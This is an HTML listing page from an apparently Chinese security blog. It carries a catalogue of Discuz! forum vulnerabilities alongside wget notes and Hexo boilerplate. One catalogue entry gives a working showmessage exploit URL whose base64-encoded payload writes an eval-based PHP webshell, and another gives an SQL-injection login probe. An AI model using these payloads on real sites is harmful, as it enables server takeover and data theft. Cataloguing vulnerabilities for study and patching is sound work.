@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/site.webmanifest.json">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://5cr1pt.github.io/blog.securitainment.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="运维 | 安全 | 渗透">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Securitainment.io">
+<meta property="og:url" content="http://5cr1pt.github.io/blog.securitainment.io/page/3/index.html">
+<meta property="og:site_name" content="Securitainment.io">
+<meta property="og:description" content="运维 | 安全 | 渗透">
+<meta property="article:author" content="groot">
+<meta property="article:tag" content="运维 | 安全 | 渗透">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://5cr1pt.github.io/blog.securitainment.io/page/3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false
+  };
+</script>
+
+  <title>Securitainment.io</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Securitainment.io</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-discuz-bug-list/" class="post-title-link" itemprop="url">Discuz vuls list</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:49:23" itemprop="dateCreated datePublished" datetime="2016-05-14T00:49:23+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:29:49" itemprop="dateModified" datetime="2019-07-25T14:29:49+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-discuz-bug-list/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-bug-list/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="Discuz-漏洞收集"><a href="#Discuz-漏洞收集" class="headerlink" title="Discuz 漏洞收集"></a>Discuz 漏洞收集</h1><pre><code>Discuz! 6.x/7.x 全局变量防御绕过漏洞  由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞. 
+
+Discuz! admin\styles.inc.php get-webshell bug   由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞. 
+
+Discuz!&lt;5.50 $onlineipmatches 未初始化漏洞     由于Discuz!&lt;5.50的common.inc.php使用preg_match()的变量$onlineipmatches 未初始化漏洞,导致可以容易构造$onlineip  
+
+Discuz! 1_modcp_editpost.tpl.php xss bug    由于Discuz!的1_modcp_editpost.tpl.php里$orig[&apos;message&apos;]未过滤,导致一个xss漏洞.   
+
+Discuz! admin\database.inc.php get-webshell bug     由于Discuz!的admin\database.inc.php里action=importzip解压zip文件时,导致可以得到webshell.   
+
+Discuz! Reset User Password Vulnerability   由于Discuz! 的 随机数使用的播种缺陷,在找会用户密码时可以暴力得到id的随机hash,从而导致容易修改用户密码的严重漏洞.   
+
+Discuz! $_DCACHE数组变量覆盖漏洞 [update 11.14]     由于Discuz! 的wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题.     
+
+Discuz! 路径信息泄露 bug  由于Discuz! cache file的数组$_DCACHE,$_CACHE等的变量名没有初始化导致路径信息泄露.  
+
+Discuz! member.php xss bug  由于Discuz!的member.php对$listgid并没有初始化导致一个严重的xss bug.  
+
+Discuz! admin\runwizard.inc.php get-webshell bug    由于Discuz!的admin\runwizard.inc.php里saverunwizardhistory()写文件操作没有限制导致执行代码漏洞.  
+
+Discuz! modcp\moderate.inc.php 数据库注射bug     由于Discuz!的modcp/moderate.inc.php里$fidadd数组变量没有初始化导致sql注射bug     
+
+Discuz! moderation.inc.php 数据库&apos;注射&apos; bug  由于Discuz!的include/moderation.inc.php存在一个&apos;二次攻击&apos;导致数据库&apos;注射&apos;的bug     
+
+Discuz! trade.php 数据库&apos;注射&apos; bug   由于Discuz!的trade.php里的$message处理不严格导致引起数据库操作错误,通过SODB-2008-06而导致xss攻击及数据库信息泄露的漏洞.    
+
+Discuz! 数据库错误信息xss bug  由于Discuz!在处理数据库的错误信息时对$GLOBALS[&apos;PHP_SELF&apos;]没有过滤,导致在让数据库出错的情况下导致xss攻击.    
+
+Discuz!4.x wap\index.php 变量覆盖漏洞     由于Discuz!的wap\index.php处理post的变量不严谨而导致变量覆盖,从而可能导致sql注射/代码执行/xss等攻击.     
+
+Discuz! cache.func.php信息泄漏的bug  由于Discuz!的\include\cache.func.php缺少访问限制导致版本及补丁消息的泄露.    
+
+Discuz! flash Crsf bug  由于Discuz!对flash跨域策略文件及上传图片文件处理不严导致可以绕过formhash及Referer的限制,导致csrf攻击.     
+
+Discuz! admincp.php xss bug     由于Discuz!的后台登陆文件$url_forward没有过滤导致一个严重的xss bug.     
+
+Discuz![flash] xss bug  由于Discuz!对上传图片文件处理不严及flash标签安全设置不严导致一个严重的xss bug.   
+
+Discuz 6.x—7.x:WAP高危漏洞,wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题
+
+Discuz 7.0-7.2:后台settings.inc.php中写shell漏洞
+
+Discuz 7.1-7.2：showmessage bug,利用方式:misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}
+
+Discuz 7.2:SQL注入漏洞/manyou/sources/notice.php
+
+Discuz 7.2代码执行漏洞
+
+Discuz! x1-1.5 SQL 注入 GetShell EXP 
+
+Discuz! X1-1.5 notify_credit.php 页面SQL注入漏洞 
+
+Discuz! 1.5 跨站脚本攻击漏洞 UC登陆页面存在跨站漏洞
+
+DiscuzX1.5 门户管理权限SQL注入BUG
+
+DZ-X1.5 论坛后台拿WebShell
+
+discuz x1.5&amp;discuz 7.2 后台getshell 0day
+
+DISCUZ X1.5 本地文件包含漏洞
+
+Discuz! X2:SQL注入漏洞source\module\forum\forum_attachment.php
+
+Discuz! X2:SQL注入member.php?mod=logging&amp;action=login，提交username=1+and+1=1
+
+Discuz!NT 2.x - 3.5.2 SQL注入(0day)
+
+Discuz!NT3.5.2文件编辑0Day获取Webshell</code></pre>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-python-tips/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-python-tips/" class="post-title-link" itemprop="url">Python skill collection</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:45:07" itemprop="dateCreated datePublished" datetime="2016-05-14T00:45:07+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:27:12" itemprop="dateModified" datetime="2019-07-25T14:27:12+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-python-tips/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-python-tips/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-pythondebugger/" target="_blank" rel="noopener">Python代码调试技巧</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/04/2016-05-14-wget-usage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/04/2016-05-14-wget-usage/" class="post-title-link" itemprop="url">wget 使用筆記</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-04 14:52:16" itemprop="dateCreated datePublished" datetime="2016-05-04T14:52:16+08:00">2016-05-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:26:17" itemprop="dateModified" datetime="2019-07-25T14:26:17+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/04/2016-05-14-wget-usage/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/04/2016-05-14-wget-usage/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h1><p>需要下载某个目录下面的所有文件。命令如下</p>
+<pre><code>wget -c -r -np -k -L -p www.xxx.org/pub/path/</code></pre><p>在下载时。有用到外部域名的图片或连接。如果需要同时下载就要用-H参数。</p>
+<pre><code>wget -np -nH -r --span-hosts www.xxx.org/pub/path/
+
+-c 断点续传
+-r 递归下载，下载指定网页某一目录下（包括子目录）的所有文件
+-nd 递归下载时不创建一层一层的目录，把所有的文件下载到当前目录
+-np 递归下载时不搜索上层目录，如wget -c -r www.xxx.org/pub/path/
+没有加参数-np，就会同时下载path的上一级目录pub下的其它文件
+-k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数
+-L 递归时不进入其它主机，如wget -c -r www.xxx.org/ </code></pre><p>如果网站内有一个这样的链接：<br><a href="http://www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站" target="_blank" rel="noopener">www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</a></p>
+<pre><code>-p 下载网页所需的所有文件，如图片等
+-A 指定要下载的文件样式列表，多个样式用逗号分隔
+-i 后面跟一个文件，文件内指明要下载的URL</code></pre><p>还有其他的用法，我从网上搜索的，也一并写上来，方便以后自己使用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2016/05/04/2016-05-14-wget-usage/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2000/01/01/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2000/01/01/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2000-01-01 00:00:00" itemprop="dateCreated datePublished" datetime="2000-01-01T00:00:00+08:00">2000-01-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-03-12 16:34:05" itemprop="dateModified" datetime="2019-03-12T16:34:05+08:00">2019-03-12</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2000/01/01/hello-world/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2000/01/01/hello-world/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+  </div>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">groot</p>
+  <div class="site-description" itemprop="description">运维 | 安全 | 渗透</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">groot</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://securitainment.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+
+</body>
+</html>
